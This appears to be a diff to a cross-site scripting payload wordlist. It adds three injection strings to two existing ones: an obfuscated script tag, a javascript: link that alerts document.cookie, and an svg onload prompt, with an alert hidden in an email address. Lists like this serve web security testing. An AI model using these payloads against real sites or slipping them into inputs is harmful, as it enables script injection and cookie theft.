@@ -1,2 +1,5 @@
 %27%29%3bconfirm%28%271
 ["');alert('XSS');//"]@xyz.xxx
+”/>&_lt;_script>alert(1)&_lt;/scr_ipt>”/>
+<iframe <><a href=javascript&colon;alert(document.cookie)>Click Here</a>=&gt;&lt;/iframe&gt;
+a"><svg/onload=prompt(1)>
